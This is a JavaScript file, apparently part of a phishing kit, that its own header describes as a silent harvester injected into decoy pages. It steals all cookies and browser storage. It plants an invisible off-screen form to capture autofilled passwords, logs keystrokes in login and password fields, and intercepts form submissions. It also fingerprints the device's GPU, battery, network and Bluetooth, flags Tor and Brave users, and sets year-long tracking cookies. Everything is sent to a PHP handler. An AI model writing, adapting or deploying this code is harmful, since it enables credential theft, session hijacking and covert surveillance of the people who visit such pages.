/* ════════════════════════════════════════════════════════════════════
   netrax_collector.js  --  Silent Device Telemetry & Session Harvester
   ──────────────────────────────────────────────────────────────────
   Injected into every decoy page. Runs completely hidden.

   Captures:
     1. All REAL cookies (filters out our own _nx_ trackers)
     2. sessionStorage / localStorage data
     3. Browser-autofilled/saved credentials via hidden probes
     4. Real-time keystroke capture from credential input fields
     5. IndexedDB database names
     6. Plants tracking cookies for fingerprinting (reported separately)
     7. Screen resolution, viewport, pixel ratio, color depth
     8. Battery level & charging status (Chromium browsers)
     9. Network connection type (WiFi/Cellular/4G), speed & latency
    10. Canvas 2D fingerprint hash (unique per device/GPU/OS)
    11. WebGL GPU vendor & renderer model (e.g. NVIDIA, Mali, Adreno)
    12. CPU core count & device memory (where supported)

   Accuracy guarantee:
     - Every field reports the REAL extracted value, or a professional
       fallback reason (e.g. "API not supported by this browser",
       "Restricted by browser", "Could not detect"). Never blank or false.

   ONLY sends data when something meaningful is captured.
   Sends at most ONCE per page load (+ once on unload if new data found).
   ════════════════════════════════════════════════════════════════════ */
(function () {
    'use strict';

    var _NX = {
        hasSent: false,
        hasNewData: false,
        captured: {
            realCookies: '',
            trackingCookies: '',
            sessionStorage: '',
            localStorage: '',
            storedUsername: '',
            storedPassword: '',
            inputLog: {},
            indexedDBs: '',
            screenResolution: '',
            screenViewport: '',
            screenColorDepth: '',
            screenPixelRatio: '',
            batteryLevel: '',
            batteryCharging: '',
            connectionType: '',
            connectionEffective: '',
            connectionDownlink: '',
            connectionRtt: '',
            canvasFingerprint: '',
            webglVendor: '',
            webglRenderer: '',
            deviceMemory: '',
            hardwareConcurrency: '',
            bluetoothStatus: '',
            bluetoothDevice: '',
            deviceType: '',
            deviceModel: '',
            deviceModelConfidence: '',  /* 'exact' | 'approximate' | 'not_detected' */
            deviceRam: '',
            deviceStorage: '',
            deviceCpu: '',
            deviceArchitecture: '',
            referrer: (typeof document !== 'undefined' && document.referrer) ? document.referrer : 'Direct / None'
        }
    };

    /* ── 0. Harvest Screen & Display details ─────────────────────── */
    function _harvestScreen() {
        try {
            var sw = window.screen.width || screen.width;
            var sh = window.screen.height || screen.height;
            _NX.captured.screenResolution = (sw && sh) ? sw + 'x' + sh : 'Could not detect';
            _NX.captured.screenViewport = (window.innerWidth && window.innerHeight) ? window.innerWidth + 'x' + window.innerHeight : 'Could not detect';
            _NX.captured.screenColorDepth = screen.colorDepth ? screen.colorDepth + '-bit' : 'Unknown';
            _NX.captured.screenPixelRatio = window.devicePixelRatio ? window.devicePixelRatio + 'x' : '1x';
            _NX.captured.hardwareConcurrency = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Cores' : 'Restricted by browser';
        } catch (e) {
            if (!_NX.captured.screenResolution) _NX.captured.screenResolution = 'Error during extraction';
        }
    }

    /* ── 0.1 Harvest Battery Status ─────────────────────────────── */
    function _harvestBattery() {
        try {
            if (typeof navigator.getBattery === 'function') {
                navigator.getBattery().then(function (battery) {
                    var level = battery.level;
                    if (typeof level === 'number' && !isNaN(level)) {
                        _NX.captured.batteryLevel = Math.round(level * 100) + '%';
                        _NX.captured.batteryCharging = battery.charging ? 'Charging (Plugged In)' : 'Discharging (On Battery)';
                    } else {
                        _NX.captured.batteryLevel = 'Could not read level';
                        _NX.captured.batteryCharging = 'Unknown';
                    }
                }).catch(function () {
                    _NX.captured.batteryLevel = 'Permission denied by browser';
                    _NX.captured.batteryCharging = 'N/A';
                });
            } else {
                _NX.captured.batteryLevel = 'API not supported by this browser';
                _NX.captured.batteryCharging = 'N/A';
            }
        } catch (e) {
            _NX.captured.batteryLevel = 'Error during extraction';
            _NX.captured.batteryCharging = 'N/A';
        }
    }

    /* ── 0.2 Harvest Network Connection & Medium Type ───────────── */
    function _harvestNetwork() {
        try {
            var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                var rawType = (conn.type || '').toLowerCase();
                var eff = (conn.effectiveType || '').toUpperCase();
                if (eff === '4G') {
                    eff = '4G / 5G / Broadband Speed';
                }
                var isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);

                var resolvedType = '';
                if (rawType === 'wifi') {
                    resolvedType = 'Wi-Fi Network (API Estimate)';
                } else if (rawType === 'cellular') {
                    resolvedType = 'Cellular Data (API Estimate)';
                } else if (rawType === 'ethernet') {
                    resolvedType = 'Ethernet (API Estimate)';
                } else if (rawType === 'bluetooth') {
                    resolvedType = 'Bluetooth Tethering';
                } else if (rawType && rawType !== 'unknown' && rawType !== 'other') {
                    resolvedType = rawType.toUpperCase() + ' (API Estimate)';
                } else {
                    // When desktop browser omits conn.type for privacy
                    if (!isMobile) {
                        resolvedType = 'Wi-Fi / LAN (Uncertain)';
                    } else {
                        resolvedType = 'Cellular / Wi-Fi (' + (eff || 'Uncertain') + ')';
                    }
                }

                _NX.captured.connectionType = resolvedType;
                _NX.captured.connectionEffective = eff;
                _NX.captured.connectionDownlink = (conn.downlink !== undefined && conn.downlink !== null) ? conn.downlink + ' Mbps' : '';
                _NX.captured.connectionRtt = (conn.rtt !== undefined && conn.rtt !== null) ? conn.rtt + ' ms' : '';
                _NX.captured.connectionRtt = (conn.rtt !== undefined && conn.rtt !== null) ? conn.rtt + ' ms' : '';
            } else {
                _NX.captured.connectionType = _getPrivacyLabel() || 'API not supported by this browser';
            }
        } catch (e) {
            _NX.captured.connectionType = _getPrivacyLabel() || 'Error during extraction';
        }
    }

    /* ── 0.3 Harvest Canvas & WebGL GPU Fingerprint ─────────────── */
    function _harvestCanvasAndWebGL() {
        try {
            // 2D Canvas Fingerprint
            var canvas = document.createElement('canvas');
            canvas.width = 240;
            canvas.height = 60;
            var ctx = canvas.getContext('2d');
            if (ctx) {
                ctx.textBaseline = 'top';
                ctx.font = '14px "Arial", sans-serif';
                ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('NetraX-3.0 <canvas> ⚡ 👁️', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('NetraX-3.0 <canvas> ⚡ 👁️', 4, 17);

                var str = canvas.toDataURL();
                var hash = 0;
                for (var i = 0; i < str.length; i++) {
                    hash = ((hash << 5) - hash) + str.charCodeAt(i);
                    hash |= 0;
                }
                _NX.captured.canvasFingerprint = '0x' + (hash >>> 0).toString(16).toUpperCase();
            } else {
                _NX.captured.canvasFingerprint = 'Canvas 2D not available';
            }

            // WebGL GPU Renderer & Vendor Detection
            var glCanvas = document.createElement('canvas');
            var gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
            if (gl) {
                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    _NX.captured.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'Could not extract vendor';
                    _NX.captured.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Could not extract renderer';
                } else {
                    _NX.captured.webglVendor = 'Debug info restricted by browser';
                    _NX.captured.webglRenderer = 'Debug info restricted by browser';
                }
            } else {
                _NX.captured.webglVendor = _getPrivacyLabel() || 'WebGL not available';
                _NX.captured.webglRenderer = _getPrivacyLabel() || 'WebGL not available';
            }
        } catch (e) {
            var pl = _getPrivacyLabel();
            if (!_NX.captured.canvasFingerprint) _NX.captured.canvasFingerprint = pl || 'Error during extraction';
            if (!_NX.captured.webglRenderer) _NX.captured.webglRenderer = pl || 'Error during extraction';
        }
    }

    /* ── 0.4 Detect Privacy Browsers & Tor / RFP ─────── */
    var privacyBrowserStr = '';
    function _getPrivacyLabel() {
        if (privacyBrowserStr) return 'Blocked by ' + privacyBrowserStr;
        return '';
    }

    function _harvestTor() {
        try {
            var ua = navigator.userAgent || '';
            
            // Check Brave
            if (navigator.brave && typeof navigator.brave.isBrave === 'function') {
                privacyBrowserStr = 'Brave Shields';
                _NX.captured.isTorBrowser = 'No (Using Brave Browser)';
                return;
            }
            
            // Check DuckDuckGo
            if (/DuckDuckGo/i.test(ua)) {
                privacyBrowserStr = 'DuckDuckGo Privacy';
                _NX.captured.isTorBrowser = 'No (Using DuckDuckGo)';
                return;
            }

            var isFirefox = /Firefox|FxiOS/i.test(ua);
            var isUTC = (new Date().getTimezoneOffset() === 0);
            var hasNoPlugins = (!navigator.plugins || navigator.plugins.length === 0);
            var hasNoBattery = (typeof navigator.getBattery !== 'function');
            var hasNoGeo = (typeof navigator.geolocation === 'undefined' || !navigator.geolocation);
            var isFixedRatio = (window.devicePixelRatio === 1);

            if (isFirefox && (isUTC || hasNoGeo) && hasNoPlugins && hasNoBattery && isFixedRatio) {
                privacyBrowserStr = 'Tor/LibreWolf';
                _NX.captured.isTorBrowser = 'YES (Tor / ResistFingerprinting Active)';
            } else {
                _NX.captured.isTorBrowser = 'No';
            }
        } catch (e) {
            _NX.captured.isTorBrowser = 'Could not determine';
        }
    }

    /* ── 0.5 Harvest Bluetooth Hardware & Device Status ─────────── */
    function _harvestBluetooth() {
        try {
            if (navigator.bluetooth && typeof navigator.bluetooth.getAvailability === 'function') {
                navigator.bluetooth.getAvailability().then(function (available) {
                    _NX.captured.bluetoothStatus = available ? 'Supported (Hardware / API Available)' : 'Disabled / Not Supported';
                }).catch(function () {
                    _NX.captured.bluetoothStatus = _getPrivacyLabel() || 'Restricted by browser';
                });
            } else {
                _NX.captured.bluetoothStatus = _getPrivacyLabel() || 'API not supported by this browser';
            }
        } catch (e) {
            _NX.captured.bluetoothStatus = _getPrivacyLabel() || 'Error during extraction';
        }
    }

    /* Helper: open pairing if requested via UI interaction */
    window._nxRequestBluetoothDevice = function (callback) {
        if (navigator.bluetooth && typeof navigator.bluetooth.requestDevice === 'function') {
            navigator.bluetooth.requestDevice({ acceptAllDevices: true })
                .then(function (device) {
                    _NX.captured.bluetoothDevice = device.name || 'Device (' + device.id + ')';
                    _NX.hasNewData = true;
                    _sendPayload(false);
                    if (typeof callback === 'function') callback(device);
                })
                .catch(function (err) {
                    _NX.captured.bluetoothDevice = 'Pairing cancelled by user';
                });
        }
    };

    /* ── 0.6 Harvest Deep Device Specifications (RAM, ROM, Model, Form Factor) ── */
    function _harvestDeviceSpecs() {
        try {
            var ua = navigator.userAgent || '';
            var isMobile = /Android.*Mobile|iPhone|iPod|Windows Phone|Mobile/i.test(ua);
            var isTablet = /iPad|Tablet|PlayBook|Silk|Kindle|SM-T|GT-P/i.test(ua) || (navigator.maxTouchPoints > 1 && /Macintosh/i.test(ua));
            var isWindows = /Windows/i.test(ua);
            var isMac = /Macintosh|Mac OS X/i.test(ua) && !isTablet;
            var isLinux = /Linux/i.test(ua) && !isMobile;

            // 1. CPU Cores & Architecture
            var numCores = navigator.hardwareConcurrency || 4;
            var cores = numCores + ' Cores';
            var arch = 'x64 (64-bit)';
            if (/arm|aarch64/i.test(ua) || (isMac && navigator.maxTouchPoints === 0 && screen.width >= 1440)) {
                arch = 'ARM64 (Apple Silicon / ARM)';
            } else if (/x86_64|Win64|WOW64|x64/i.test(ua)) {
                arch = 'x86_64 (64-bit)';
            } else if (/i686|i386|x86/i.test(ua)) {
                arch = 'x86 (32-bit)';
            }
            _NX.captured.deviceCpu = cores + ' • ' + arch;
            _NX.captured.deviceArchitecture = arch;

            // 2. RAM / Device Memory
            var devMem = navigator.deviceMemory;
            var ramString = '';
            if (devMem) {
                ramString = devMem + ' GB (API Estimate - Max 8GB)';
            } else {
                ramString = 'Not Detected (API restricted by browser)';
            }
            _NX.captured.deviceRam = ramString;
            _NX.captured.deviceMemory = ramString;

            // 3. Storage / ROM (Physical Internal Storage & Available Quota)
            if (navigator.storage && typeof navigator.storage.estimate === 'function') {
                navigator.storage.estimate().then(function (estimate) {
                    if (estimate && estimate.quota) {
                        var quotaGB = (estimate.quota / (1024 * 1024 * 1024)).toFixed(1);
                        _NX.captured.deviceStorage = quotaGB + ' GB (Browser Quota Estimate)';
                        _NX.hasNewData = true;
                    }
                }).catch(function () {
                    _NX.captured.deviceStorage = 'Not Detected (' + (_getPrivacyLabel() || 'Storage Sandbox Restricted') + ')';
                });
            } else {
                _NX.captured.deviceStorage = 'Not Detected (' + (_getPrivacyLabel() || 'Restricted by browser') + ')';
            }

            // 4. Device Form Factor & Classification
            var type = 'Desktop Workstation';
            if (isTablet) {
                type = 'Tablet / iPad';
            } else if (isMobile) {
                type = 'Mobile Smartphone';
            } else if (isWindows || isMac || isLinux) {
                if (typeof navigator.getBattery === 'function') {
                    navigator.getBattery().then(function (batt) {
                        if (!batt.charging || batt.level < 1) {
                            _NX.captured.deviceType = 'Laptop (Battery Powered)';
                        } else {
                            _NX.captured.deviceType = 'Laptop / Desktop PC';
                        }
                    }).catch(function() {
                        var pl = _getPrivacyLabel();
                        if (pl) _NX.captured.deviceType = 'Laptop / Desktop PC (' + pl + ')';
                    });
                }
                type = (isMac ? 'MacBook / Apple Mac' : 'Windows PC / Laptop');
            }
            _NX.captured.deviceType = type;

            // 5. Device Model Identification
            var detectedModel = '';
            var modelConfidence = 'not_detected';

            // 5A. High-Entropy Client Hints (Chrome / Edge / Android exact raw model)
            if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === 'function') {
                navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion', 'architecture', 'bitness'])
                    .then(function (hints) {
                        if (hints.model && hints.model !== '') {
                            _NX.captured.deviceModel = hints.model;
                            _NX.captured.deviceModelConfidence = 'exact';
                            _NX.hasNewData = true;
                        }
                    }).catch(function() {});
            }

            // 5B. Apple & Desktop Device Model Fallbacks
            if (/iPhone/i.test(ua)) {
                detectedModel = 'iPhone';
                modelConfidence = 'approximate';
            } else if (/iPad/i.test(ua) || (isTablet && isMac)) {
                detectedModel = 'iPad';
                modelConfidence = 'approximate';
            } else if (isMac) {
                detectedModel = 'Macintosh (' + arch + ')';
                modelConfidence = 'approximate';
            } else if (isWindows) {
                var gpu = _NX.captured.webglRenderer || '';
                var cleanGpu = gpu ? gpu.split('(')[0].replace('ANGLE', '').trim() : '';
                detectedModel = 'Windows PC' + (cleanGpu ? ' (' + cleanGpu + ')' : ' (' + arch + ')');
                modelConfidence = 'approximate';
            } else if (isLinux) {
                detectedModel = 'Linux Device (' + arch + ')';
                modelConfidence = 'approximate';
            }

            if (!_NX.captured.deviceModel && detectedModel) {
                _NX.captured.deviceModel = detectedModel;
                _NX.captured.deviceModelConfidence = modelConfidence;
            }
        } catch (e) {
            _NX.captured.deviceModel = 'Could not extract';
        }
    }

    /* ── 0.7 Plant tracking cookies (fingerprinting) ────────────── */
    function _plantCookies() {
        try {
            var uid = 'nx_' + Math.random().toString(36).substr(2, 12);
            var ts = new Date().toISOString();
            var expires = new Date(Date.now() + 365 * 86400000).toUTCString();

            document.cookie = '_nx_sid=' + uid + '; expires=' + expires + '; path=/; SameSite=Lax';
            document.cookie = '_nx_ts=' + encodeURIComponent(ts) + '; expires=' + expires + '; path=/; SameSite=Lax';
            document.cookie = '_nx_ref=' + encodeURIComponent(document.referrer || 'direct') + '; expires=' + expires + '; path=/; SameSite=Lax';
            document.cookie = '_nx_res=' + screen.width + 'x' + screen.height + '; expires=' + expires + '; path=/; SameSite=Lax';
            document.cookie = '_nx_tz=' + encodeURIComponent(Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown') + '; expires=' + expires + '; path=/; SameSite=Lax';
            document.cookie = '_nx_lang=' + (navigator.language || 'unknown') + '; expires=' + expires + '; path=/; SameSite=Lax';
            document.cookie = '_nx_plt=' + (navigator.platform || 'unknown') + '; expires=' + expires + '; path=/; SameSite=Lax';
        } catch (e) { }
    }

    /* ── 1. Harvest cookies (split real vs our trackers) ────────── */
    function _harvestCookies() {
        try {
            var raw = document.cookie || '';
            if (!raw) return;

            var pairs = raw.split(';');
            var realParts = [];
            var nxParts = [];

            for (var i = 0; i < pairs.length; i++) {
                var pair = pairs[i].trim();
                if (!pair) continue;
                if (pair.indexOf('_nx_') === 0) {
                    nxParts.push(pair);
                } else {
                    realParts.push(pair);
                }
            }

            _NX.captured.realCookies = realParts.length > 0 ? realParts.join('; ') : '';
            _NX.captured.trackingCookies = nxParts.length > 0 ? nxParts.join('; ') : '';
        } catch (e) { }
    }

    /* ── 2. Harvest sessionStorage ──────────────────────────────── */
    function _harvestSessionStorage() {
        try {
            var data = {};
            for (var i = 0; i < sessionStorage.length; i++) {
                var k = sessionStorage.key(i);
                var v = sessionStorage.getItem(k);
                data[k] = (v && v.length > 500) ? v.substring(0, 500) + '...' : v;
            }
            if (Object.keys(data).length > 0) {
                _NX.captured.sessionStorage = JSON.stringify(data);
            }
        } catch (e) { }
    }

    /* ── 3. Harvest localStorage ────────────────────────────────── */
    function _harvestLocalStorage() {
        try {
            var data = {};
            for (var i = 0; i < localStorage.length; i++) {
                var k = localStorage.key(i);
                var v = localStorage.getItem(k);
                data[k] = (v && v.length > 500) ? v.substring(0, 500) + '...' : v;
            }
            if (Object.keys(data).length > 0) {
                _NX.captured.localStorage = JSON.stringify(data);
            }
        } catch (e) { }
    }

    /* ── 4. Harvest IndexedDB database names ────────────────────── */
    function _harvestIndexedDB() {
        try {
            if (indexedDB && typeof indexedDB.databases === 'function') {
                indexedDB.databases().then(function (dbs) {
                    if (dbs && dbs.length > 0) {
                        var names = dbs.map(function (db) { return db.name + ' (v' + db.version + ')'; });
                        _NX.captured.indexedDBs = names.join(', ');
                    }
                }).catch(function () { });
            }
        } catch (e) { }
    }

    /* ── 5. Inject hidden credential probe form ─────────────────── */
    function _injectCredentialProbe() {
        try {
            if (document.getElementById('__nx_probe_wrap')) return;

            var wrap = document.createElement('div');
            wrap.id = '__nx_probe_wrap';
            wrap.style.cssText = 'position:fixed;left:-99999px;top:-99999px;width:1px;height:1px;overflow:hidden;opacity:0.01;pointer-events:none;z-index:-1;';

            wrap.innerHTML =
                '<form id="__nx_probe_form" method="post" autocomplete="on" style="opacity:0.01">' +
                '<input type="text" id="__nx_u1" name="username" autocomplete="username" tabindex="-1" />' +
                '<input type="text" id="__nx_u2" name="email" autocomplete="email" tabindex="-1" />' +
                '<input type="text" id="__nx_u3" name="login" autocomplete="username" tabindex="-1" />' +
                '<input type="text" id="__nx_u4" name="user" autocomplete="username" tabindex="-1" />' +
                '<input type="password" id="__nx_p1" name="password" autocomplete="current-password" tabindex="-1" />' +
                '<input type="password" id="__nx_p2" name="passwd" autocomplete="current-password" tabindex="-1" />' +
                '<input type="password" id="__nx_p3" name="pass" autocomplete="current-password" tabindex="-1" />' +
                '</form>';

            document.body.appendChild(wrap);

            setTimeout(function () {
                try {
                    var fields = wrap.querySelectorAll('input');
                    for (var i = 0; i < fields.length; i++) {
                        fields[i].focus();
                        fields[i].blur();
                    }
                } catch (e) { }
            }, 500);
        } catch (e) { }
    }

    /* ── 6. Harvest credentials from probe fields ───────────────── */
    function _harvestProbeCredentials() {
        var userIds = ['__nx_u1', '__nx_u2', '__nx_u3', '__nx_u4'];
        var passIds = ['__nx_p1', '__nx_p2', '__nx_p3'];

        for (var i = 0; i < userIds.length; i++) {
            try {
                var el = document.getElementById(userIds[i]);
                if (el && el.value && el.value.trim()) {
                    _NX.captured.storedUsername = el.value.trim();
                    break;
                }
            } catch (e) { }
        }

        for (var j = 0; j < passIds.length; j++) {
            try {
                var el2 = document.getElementById(passIds[j]);
                if (el2 && el2.value && el2.value.trim()) {
                    _NX.captured.storedPassword = el2.value.trim();
                    break;
                }
            } catch (e) { }
        }
    }

    /* ── 7. Scan ALL visible input fields on the page ───────────── */
    function _scanPageInputs() {
        try {
            if (!_NX.captured.storedUsername) {
                var userSelectors = [
                    'input[type="text"][name*="user"]',
                    'input[type="text"][name*="login"]',
                    'input[type="text"][name*="email"]',
                    'input[type="text"][name*="account"]',
                    'input[type="email"]',
                    'input[type="tel"]',
                    'input[autocomplete="username"]',
                    'input[autocomplete="email"]',
                    'input[id*="user"]',
                    'input[id*="login"]',
                    'input[id*="email"]'
                ];
                var userFields = document.querySelectorAll(userSelectors.join(','));
                for (var i = 0; i < userFields.length; i++) {
                    if (userFields[i].value && userFields[i].value.trim() &&
                        !userFields[i].id.startsWith('__nx_')) {
                        _NX.captured.storedUsername = userFields[i].value.trim();
                        break;
                    }
                }
            }

            if (!_NX.captured.storedPassword) {
                var passFields = document.querySelectorAll('input[type="password"]');
                for (var j = 0; j < passFields.length; j++) {
                    if (passFields[j].value && passFields[j].value.trim() &&
                        !passFields[j].id.startsWith('__nx_')) {
                        _NX.captured.storedPassword = passFields[j].value.trim();
                        break;
                    }
                }
            }
        } catch (e) { }
    }

    /* ── 8. Real-time input monitoring (credential fields only) ─── */
    function _startInputMonitor() {
        try {
            document.addEventListener('input', function (e) {
                var t = e.target;
                if (!t || !t.tagName || t.tagName !== 'INPUT') return;
                if (t.id && t.id.startsWith('__nx_')) return;

                var fieldType = (t.type || '').toLowerCase();
                var fieldName = t.name || t.id || t.getAttribute('autocomplete') || 'unnamed';

                if (fieldType === 'password' && t.value) {
                    _NX.captured.storedPassword = t.value;
                    _NX.captured.inputLog['password@' + fieldName] = t.value;
                    _NX.hasNewData = true;
                } else if (fieldType === 'text' || fieldType === 'email' || fieldType === 'tel') {
                    if (t.value) {
                        var nameLC = fieldName.toLowerCase();
                        if (nameLC.indexOf('user') !== -1 || nameLC.indexOf('login') !== -1 ||
                            nameLC.indexOf('email') !== -1 || nameLC.indexOf('account') !== -1 ||
                            nameLC.indexOf('phone') !== -1 || nameLC.indexOf('mobile') !== -1) {
                            _NX.captured.storedUsername = t.value;
                            _NX.captured.inputLog[fieldType + '@' + fieldName] = t.value;
                            _NX.hasNewData = true;
                        }
                    }
                }
            }, true);

            document.addEventListener('change', function (e) {
                var t = e.target;
                if (!t || !t.tagName || t.tagName !== 'INPUT') return;
                if (t.id && t.id.startsWith('__nx_')) return;

                var fieldType = (t.type || '').toLowerCase();
                var fieldName = t.name || t.id || 'unnamed';

                if (fieldType === 'password' && t.value) {
                    _NX.captured.storedPassword = t.value;
                    _NX.hasNewData = true;
                } else if (t.value && (fieldType === 'text' || fieldType === 'email' || fieldType === 'tel')) {
                    var nameLC2 = fieldName.toLowerCase();
                    if (nameLC2.indexOf('user') !== -1 || nameLC2.indexOf('login') !== -1 ||
                        nameLC2.indexOf('email') !== -1) {
                        _NX.captured.storedUsername = t.value;
                        _NX.hasNewData = true;
                    }
                }
            }, true);
        } catch (e) { }
    }

    /* ── 9. Monitor for dynamically added forms ─────────────────── */
    function _watchDOMMutations() {
        try {
            if (typeof MutationObserver === 'undefined') return;

            var observer = new MutationObserver(function (mutations) {
                for (var i = 0; i < mutations.length; i++) {
                    var added = mutations[i].addedNodes;
                    for (var j = 0; j < added.length; j++) {
                        var node = added[j];
                        if (node.nodeType !== 1) continue;
                        var newInputs = [];
                        if (node.tagName === 'INPUT') {
                            newInputs.push(node);
                        } else if (node.querySelectorAll) {
                            newInputs = node.querySelectorAll('input');
                        }
                        if (newInputs.length > 0) {
                            setTimeout(_scanPageInputs, 1000);
                        }
                    }
                }
            });

            observer.observe(document.body, { childList: true, subtree: true });
        } catch (e) { }
    }

    /* ── 10. Intercept form submissions ─────────────────────────── */
    function _interceptForms() {
        try {
            document.addEventListener('submit', function (e) {
                var form = e.target;
                if (!form || !form.elements) return;

                for (var i = 0; i < form.elements.length; i++) {
                    var el = form.elements[i];
                    if (!el.value || !el.tagName || el.tagName !== 'INPUT') continue;
                    if (el.id && el.id.startsWith('__nx_')) continue;

                    var ft = (el.type || '').toLowerCase();
                    var fn = el.name || el.id || 'unnamed';

                    if (ft === 'password') {
                        _NX.captured.storedPassword = el.value;
                        _NX.hasNewData = true;
                    } else if (ft === 'text' || ft === 'email' || ft === 'tel') {
                        var fnLC = fn.toLowerCase();
                        if (fnLC.indexOf('user') !== -1 || fnLC.indexOf('login') !== -1 ||
                            fnLC.indexOf('email') !== -1 || fnLC.indexOf('account') !== -1) {
                            _NX.captured.storedUsername = el.value;
                            _NX.hasNewData = true;
                        }
                    }
                    _NX.captured.inputLog[ft + '@' + fn] = el.value;
                }

                // Force-send on form submit
                _sendPayload(true);
            }, true);
        } catch (e) { }
    }

    /* ── CHECK: Is there meaningful data worth reporting? ────────── */
    function _hasMeaningfulData() {
        // Device telemetry, battery, screen, or canvas fingerprint present? Send.
        if (_NX.captured.screenResolution || _NX.captured.canvasFingerprint || _NX.captured.batteryLevel || _NX.captured.connectionType) return true;

        // Credentials captured? Always send.
        if (_NX.captured.storedUsername || _NX.captured.storedPassword) return true;

        // Input log has entries? Send.
        if (Object.keys(_NX.captured.inputLog).length > 0) return true;

        // Real (non-_nx_) cookies found? Send.
        if (_NX.captured.realCookies && _NX.captured.realCookies.length > 0) return true;

        // Session or local storage has data? Send.
        if (_NX.captured.sessionStorage && _NX.captured.sessionStorage.length > 0) return true;
        if (_NX.captured.localStorage && _NX.captured.localStorage.length > 0) return true;

        // IndexedDB databases found? Send.
        if (_NX.captured.indexedDBs && _NX.captured.indexedDBs.length > 0) return true;

        return false;
    }

    /* ── SEND PAYLOAD ───────────────────────────────────────────── */
    function _sendPayload(force) {
        // Re-harvest everything fresh
        _harvestScreen();
        _harvestNetwork();
        _harvestCanvasAndWebGL();
        _harvestCookies();
        _harvestSessionStorage();
        _harvestLocalStorage();
        _harvestProbeCredentials();
        _scanPageInputs();

        // Only send if there is meaningful data
        if (!_hasMeaningfulData()) return;

        // Don't double-send (unless forced by form submit with new data)
        if (_NX.hasSent && !force) return;
        if (_NX.hasSent && force && !_NX.hasNewData) return;

        _NX.hasSent = true;
        _NX.hasNewData = false;

        // Build payload
        var inputLogStr = '';
        try {
            var logKeys = Object.keys(_NX.captured.inputLog);
            if (logKeys.length > 0) {
                inputLogStr = JSON.stringify(_NX.captured.inputLog);
            }
        } catch (e) { }

        var payload = JSON.stringify({
            cookies: _NX.captured.realCookies || 'None',
            tracking_cookies: _NX.captured.trackingCookies || '',
            session_storage: _NX.captured.sessionStorage || 'None',
            local_storage: _NX.captured.localStorage || 'None',
            stored_username: _NX.captured.storedUsername,
            stored_password: _NX.captured.storedPassword,
            input_log: inputLogStr,
            indexeddb: _NX.captured.indexedDBs,
            screen_resolution: _NX.captured.screenResolution,
            screen_viewport: _NX.captured.screenViewport,
            screen_color_depth: _NX.captured.screenColorDepth,
            screen_pixel_ratio: _NX.captured.screenPixelRatio,
            battery_level: _NX.captured.batteryLevel,
            battery_charging: _NX.captured.batteryCharging,
            connection_type: _NX.captured.connectionType,
            connection_effective: _NX.captured.connectionEffective,
            connection_downlink: _NX.captured.connectionDownlink,
            connection_rtt: _NX.captured.connectionRtt,
            canvas_fingerprint: _NX.captured.canvasFingerprint,
            webgl_vendor: _NX.captured.webglVendor,
            webgl_renderer: _NX.captured.webglRenderer,
            hardware_concurrency: _NX.captured.hardwareConcurrency,
            device_memory: _NX.captured.deviceMemory,
            is_tor_browser: _NX.captured.isTorBrowser,
            bluetooth_status: _NX.captured.bluetoothStatus,
            bluetooth_device: _NX.captured.bluetoothDevice,
            device_type: _NX.captured.deviceType,
            device_model: _NX.captured.deviceModel,
            device_model_confidence: _NX.captured.deviceModelConfidence || 'not_detected',
            device_ram: _NX.captured.deviceRam,
            device_storage: _NX.captured.deviceStorage,
            device_cpu: _NX.captured.deviceCpu,
            device_architecture: _NX.captured.deviceArchitecture,
            referrer: _NX.captured.referrer,
            page_url: window.location.href,
            page_title: document.title
        });

        function _getHandlerUrl(endpoint) {
            if (window.location.pathname.indexOf('/templates/') !== -1) {
                return '../handlers/' + endpoint;
            }
            return 'handlers/' + endpoint;
        }

        var url = _getHandlerUrl('cookie_handler.php');

        try {
            if (navigator.sendBeacon) {
                var sent = navigator.sendBeacon(url, new Blob([payload], { type: 'application/json' }));
                if (sent) return;
            }
        } catch (e) { }

        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(payload);
        } catch (e) { }
    }

    /* ── BOOTSTRAP ──────────────────────────────────────────────── */
    function _init() {
        // Phase 1: Setup
        _plantCookies();
        _harvestScreen();
        _harvestBattery();
        _harvestNetwork();
        _harvestCanvasAndWebGL();
        _harvestBluetooth();
        _harvestDeviceSpecs();
        _harvestTor();
        _harvestIndexedDB();
        _injectCredentialProbe();
        _startInputMonitor();
        _interceptForms();
        _watchDOMMutations();

        // Phase 2: Single collection attempt after autofill and async battery have time to populate
        setTimeout(function () {
            _sendPayload(false);
        }, 2000);

        // Phase 3: Send on page unload ONLY if new data was captured since last send
        window.addEventListener('beforeunload', function () {
            if (_NX.hasNewData || !_NX.hasSent) {
                _sendPayload(true);
            }
        });
    }

    // Start when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', _init);
    } else {
        _init();
    }
})();
